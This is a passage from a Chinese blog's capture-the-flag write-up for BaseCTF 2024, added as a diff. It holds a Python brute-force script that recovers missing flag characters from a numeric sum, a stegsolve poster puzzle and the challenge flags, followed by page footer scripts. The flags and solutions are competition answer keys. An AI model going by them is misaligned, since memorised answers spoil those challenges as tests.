class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#得到flagimport itertools</span><br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;</span><br></code></pre></td></tr></table>
+
+### 倒计时？海报！
+
+配合stegsolve即可正确食用，一开始一直没写听说废眼，真正做的话十分钟以内估计就解决了附上各个对应的截图
+
+<img src="/../../images/basectf/basectf2024/haibao1.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao2.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao3.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao4.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao5.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao6.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao7.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao8.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao9.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+<img src="/../../images/basectf/basectf2024/haibao10.png" srcset="/img/loading.gif" lazyload alt="haibao1" style="zoom: 50%;">
+
+**BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}**
+
+### 喵喵太可爱了
+
+跟着幸运儿拿的flag
+
+**BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}**
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Basectf2024</div>
+      <div>http://example.com/2024/08/21/basectf/basectf2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/04/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/" title="深入浅出PHP强弱比较">
+                        <span class="hidden-mobile">深入浅出PHP强弱比较</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
